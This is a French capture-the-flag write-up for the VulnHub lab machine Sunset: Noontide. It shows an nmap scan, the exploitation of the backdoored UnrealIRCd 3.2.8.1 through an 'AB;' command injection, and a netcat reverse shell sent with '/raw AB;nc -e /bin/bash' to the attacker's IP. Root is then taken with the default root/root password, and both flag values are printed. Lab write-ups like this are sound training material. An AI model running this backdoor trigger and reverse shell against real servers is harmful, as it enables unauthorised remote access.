---
title: "Solution du CTF Sunset: Noontide de VulnHub"
tags: [CTF, VulnHub]
---


[Sunset: Noontide](https://vulnhub.com/entry/sunset-noontide,531/) est à l'heure de ces lignes le dernier CTF de la série créé par [whitecr0wz](https://vulnhub.com/author/whitecr0wz,630/).

Il est assez surprenant, déjà sur la liste des ports en écoute. Pour le reste, je dirais juste qu'il faut tester, même les idées qui paraissent stupides.

```console
$ sudo nmap -p- -T5 -sCV --script vuln 192.168.56.168
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 10:43 CEST
Nmap scan report for 192.168.56.168
Host is up (0.0010s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
| irc-botnet-channels: 
|_  ERROR: Closing Link: [192.168.56.1] (Too many unknown connections from your IP)
6697/tcp open  irc     UnrealIRCd
| irc-botnet-channels: 
|_  ERROR: Closing Link: [192.168.56.1] (Too many unknown connections from your IP)
|_ssl-ccs-injection: No reply from server (TIMEOUT)
8067/tcp open  irc     UnrealIRCd
| irc-botnet-channels: 
|_  ERROR: Closing Link: [192.168.56.1] (Too many unknown connections from your IP)
MAC Address: 08:00:27:2A:0B:87 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.49 seconds
```

On a donc un serveur IRC qui écoute sur 3 ports.

Je me connecte avec `HexChat` de cette manière je vois la version du serveur dans les messages :

```
* *** Couldn't resolve your hostname; using your IP address instead
* You have not registered
* Welcome to the ROXnet IRC Network sirius!sirius@192.168.56.1
* Your host is irc.foonet.com, running version Unreal3.2.8.1
* This server was created Sat 08 Aug EDT at 2020 07:03:52 PM
* irc.foonet.com Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
* UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 :are supported by this server
* WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ :are supported by this server
* EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP :are supported by this server
* There are 1 users and 0 invisible on 1 servers
* I have 1 clients and 0 servers
* Current Local Users: 1  Max: 1
* Current Global Users: 1  Max: 1
* MOTD File is missing
```

Cette version a été backdoorée. On trouve sur *exploit-db* un module Metasploit ainsi qu'un exploit en Perl :

[UnrealIRCd 3.2.8.1 - Remote Downloader/Execute - Linux remote Exploit](https://www.exploit-db.com/exploits/13853)

Dans tous les cas il convient de simplement envoyer une commande système de cette façon au serveur : `AB;commande;`

J'ai modifié l'exploit Perl pour qu'il utilise des commandes de mon choix, mais ni `cURL` ni `Wget` ne semblaient se connecter à ma machine.

Je peux aussi utiliser la commande `/raw` du client IRC pour passer des commandes directement. J'ai finalement obtenu un reverse-shell avec la commande suivante :

```
/raw AB;nc -e /bin/bash 192.168.56.1 9999
```

On obtient un shell pour l'utilisateur `server` :

```console
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.168.
Ncat: Connection from 192.168.56.168:46428.
id
uid=1000(server) gid=1000(server) groups=1000(server),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

Et notre premier flag :

```console
server@noontide:/home/server$ cat local.txt 
c53c08b5bf2b0801c5d0c24149826a6e
```

Après avoir énuméré pendant un moment sans résultats j'ai juste tenté de me connecter avec `root` / `root` et c'est passé :

```console
server@noontide:/home/server$ su
Password: 
root@noontide:/home/server# cd
root@noontide:~# ls
proof.txt
root@noontide:~# cat proof.txt 
ab28c8ca8da1b9ffc2d702ac54221105

Thanks for playing! - Felipe Winsnes (@whitecr0wz)
```


